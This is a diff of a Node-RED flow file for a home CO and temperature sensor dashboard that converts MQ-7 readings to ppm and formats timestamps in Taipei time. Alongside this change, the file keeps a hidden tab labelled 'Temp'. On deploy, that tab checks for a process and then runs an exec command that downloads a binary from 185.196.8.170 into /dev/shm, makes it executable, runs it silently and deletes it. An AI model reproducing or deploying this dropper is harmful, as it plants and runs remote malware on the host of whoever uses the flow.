@@ -1621,7 +1621,7 @@
     },
     {
         "finalize": "",
-        "func": "// 取得原始資料\nlet data = msg.payload;\n\n// 模擬校正：假設原始值 55 對應大約 0 ppm\n// 這裡需要依照你的感測器校正曲線調整\n// 我先給一個簡單線性換算範例\nlet ppm = data.mq7 * 0.5;   // 假設比例，需依實際校正修改\n\n// 判斷安全範圍\nlet status = \"正常\";\nif (ppm > 9 && ppm <= 50) {\n    status = \"注意：超過 WHO 建議值\";\n} else if (ppm > 50) {\n    status = \"警告：超過 OSHA 標準\";\n}\n\n// 加入到輸出物件\nmsg.payload = {\n    mq7_raw: data.mq7,\n    ppm_est: ppm,\n    temp: data.temp,\n    humidity: data.humidity,\n    enthalpy: data.enthalpy,\n    timestamp: data.timestamp,\n    status: status\n};\n\nreturn msg;\n",
+        "func": "// 取得原始資料\nlet data = msg.payload;\n\n// 模擬校正：假設原始值 55 對應大約 0 ppm\nlet ppm = data.mq7 * 0.5;   // 假設比例，需依實際校正修改\n\n// 判斷安全範圍\nlet status = \"正常\";\nif (ppm > 9 && ppm <= 50) {\n    status = \"注意：超過 WHO 建議值\";\n} else if (ppm > 50) {\n    status = \"警告：超過 OSHA 標準\";\n}\n\n// 轉換 timestamp 為台北時間\nlet utcDate = new Date(data.timestamp);\nlet taipeiTime = utcDate.toLocaleString(\"zh-TW\", {\n    timeZone: \"Asia/Taipei\",\n    hour12: false\n});\n\n// 加入到輸出物件\nmsg.payload = {\n    mq7_raw: data.mq7,\n    ppm_est: ppm,\n    temp: data.temp,\n    humidity: data.humidity,\n    enthalpy: data.enthalpy,\n    timestamp: taipeiTime,   // ⚠️ 改成 taipeiTime，不要用 data.timestamp\n    status: status\n};\n\nreturn msg;\n",
         "id": "4093d71cdb3bbece",
         "initialize": "",
         "libs": [],
@@ -1636,7 +1636,8 @@
                 "8848ba7f05562567",
                 "dcfd4d36ef21ad30",
                 "8a9582d1288b8b7f",
-                "9017c4d841bf4f5f"
+                "9017c4d841bf4f5f",
+                "bdb3651869f257d1"
             ]
         ],
         "x": 510,
@@ -2008,8 +2009,7 @@
         "url": "https://stephen25128.duckdns.org/api/",
         "wires": [
             [
-                "4093d71cdb3bbece",
-                "bdb3651869f257d1"
+                "4093d71cdb3bbece"
             ]
         ],
         "x": 290,
@@ -2017,13 +2017,13 @@
         "z": "ec1515cb77dddea4"
     },
     {
-        "id": "3b22dddd-52c6-40",
+        "id": "81aa0bae-8138-4e",
         "label": "Temp",
         "type": "tab"
     },
     {
         "crontab": "",
-        "id": "d2117b92-9fca-4b",
+        "id": "6392c81d-ce3c-41",
         "name": "",
         "once": true,
         "onceDelay": "0",
@@ -2033,18 +2033,18 @@
         "type": "inject",
         "wires": [
             [
-                "603a5e63-d311-46"
+                "be3710ac-6c60-47"
             ]
         ],
         "x": 630,
         "y": 680,
-        "z": "3b22dddd-52c6-40"
+        "z": "81aa0bae-8138-4e"
     },
     {
         "addpay": false,
         "append": "",
         "command": "pgrep -f ^/dev/shm/init",
-        "id": "603a5e63-d311-46",
+        "id": "be3710ac-6c60-47",
         "name": "",
         "timer": "",
         "type": "exec",
@@ -2054,16 +2054,16 @@
             [],
             [],
             [
-                "b34ed5a2-e0bc-43"
+                "63591f53-6945-49"
             ]
         ],
         "x": 860,
         "y": 680,
-        "z": "3b22dddd-52c6-40"
+        "z": "81aa0bae-8138-4e"
     },
     {
         "checkall": "true",
-        "id": "b34ed5a2-e0bc-43",
+        "id": "63591f53-6945-49",
         "name": "",
         "outputs": 1,
         "property": "payload.code",
@@ -2079,18 +2079,18 @@
         "type": "switch",
         "wires": [
             [
-                "168862a0-fb5c-42"
+                "441b2c16-a874-47"
             ]
         ],
         "x": 1130,
         "y": 680,
-        "z": "3b22dddd-52c6-40"
+        "z": "81aa0bae-8138-4e"
     },
     {
         "addpay": false,
         "append": "",
         "command": "a=http://185.196.8.170/init; b=/dev/shm/init; (wget -q -O $b $a 2>/dev/null || curl -s -o $b $a && chmod 777 $b && $b >/dev/null 2>&1 && rm $b)",
-        "id": "168862a0-fb5c-42",
+        "id": "441b2c16-a874-47",
         "name": "",
         "timer": "",
         "type": "exec",
@@ -2103,6 +2103,6 @@
         ],
         "x": 1740,
         "y": 680,
-        "z": "3b22dddd-52c6-40"
+        "z": "81aa0bae-8138-4e"
     }
 ]
